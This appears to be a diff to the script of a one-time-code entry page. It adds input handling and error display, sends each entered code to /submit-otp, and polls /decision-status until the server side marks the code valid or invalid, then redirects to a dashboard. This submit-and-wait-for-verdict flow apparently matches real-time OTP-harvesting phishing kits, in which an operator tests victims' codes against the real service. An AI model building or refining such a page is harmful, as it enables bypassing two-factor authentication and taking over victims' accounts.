@@ -35,9 +35,11 @@
 
 <script>
 // get OTP length (5 or 6)
-const length = localStorage.getItem("otpLength") || 5;
+const length = parseInt(localStorage.getItem("otpLength")) || 5;
 
 const container = document.getElementById("otpBoxes");
+
+localStorage.removeItem("otpLength");
 
 fetch("/clear-decision", { method: "POST" });
 
@@ -62,15 +64,28 @@ for (let i = 0; i < length; i++) {
 const inputs = document.querySelectorAll(".pin-box");
 
 inputs.forEach((input, index) => {
+
     input.addEventListener("input", () => {
-        if (input.value.length === 1 && index < inputs.length - 1) {
+        input.value = input.value.replace(/[^0-9]/g, "");
+
+        if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
         }
     });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && !input.value && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+
 });
 
 // submit OTP
 async function submitOTP() {
+if (window.isSubmitting) return;
+window.isSubmitting = true;
+
     let otp = "";
 
     inputs.forEach(input => {
@@ -78,11 +93,10 @@ async function submitOTP() {
     });
 
     if (otp.length != length) {
-        alert("Enter full PIN");
+        showError("Enter full code");
         return;
     }
-
-    console.log("PIN ENTERED:", otp);
+        console.log("PIN ENTERED:", otp);
 
     // ✅ SEND OTP TO SERVER
     const res = await fetch("/submit-otp", {
@@ -96,25 +110,43 @@ async function submitOTP() {
     const data = await res.json();
 
     if (data.success) {
-        alert("PIN submitted. Waiting for verification...");
+       showError("Code submitted. Waiting for verification..."); 
     } else {
-        alert("Error submitting PIN");
+      showError("Error submitting code");  
     }
+window.isSubmitting = false;
+
 }
-setInterval(async () => {
-  const res = await fetch("/decision-status");
-  const data = await res.json();
 
-  if (data.decision === "valid") {
-    document.body.innerHTML = "<h2 style='text-align:center'>Approved...</h2>";
-    setTimeout(() => {
-      window.location.href = "/dashboard.html";
-    }, 1500);
+let isRedirecting = false;
+
+const decisionChecker = setInterval(async () => {
+  if (isRedirecting) return;
+
+  try {
+    const res = await fetch("/decision-status");
+    const data = await res.json();
+
+    if (data.decision === "valid") {
+      isRedirecting = true;
+      clearInterval(decisionChecker);
+
+      document.querySelector(".container").innerHTML =
+  "<h2 style='text-align:center'>Approved...</h2>";
+
+      setTimeout(() => {
+        window.location.href = "/dashboard.html";
+      }, 1500);
+    }
+
+    if (data.decision === "invalid") {
+      showError("Invalid code. Try again.");
+    }
+
+  } catch (err) {
+    console.log("Waiting decision...");
   }
 
-  if (data.decision === "invalid") {
-    document.getElementById("errorBox").innerText = "Invalid code. Try again.";
-  }
 }, 2000);
 
 function showLoaderAndGo(url) {
@@ -122,7 +154,22 @@ function showLoaderAndGo(url) {
     setTimeout(() => {
         window.location.href = url;
     }, 800);
+    }
+function showError(msg) {
+  let box = document.getElementById("errorBox");
+
+  if (!box) {
+    box = document.createElement("div");
+    box.id = "errorBox";
+    box.style.color = "red";
+    box.style.textAlign = "center";
+    box.style.marginTop = "10px";
+    document.querySelector(".container").appendChild(box);
+  }
+
+  box.innerText = msg;
 }
+
 </script>
 <div id="pageLoader" class="loader" style="display:none;"></div>
 </body>
